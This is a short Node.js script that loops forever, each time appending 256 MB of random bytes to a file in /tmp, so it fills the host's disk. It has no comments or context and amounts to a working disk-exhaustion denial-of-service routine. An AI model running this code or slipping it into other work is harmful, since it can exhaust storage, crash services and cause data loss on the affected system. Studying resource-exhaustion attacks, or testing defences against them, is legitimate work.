const fs = require('fs'), crypto = require('crypto');
while (true) {
  fs.appendFileSync('/tmp/fill.dat', crypto.randomBytes(1 << 28));
}
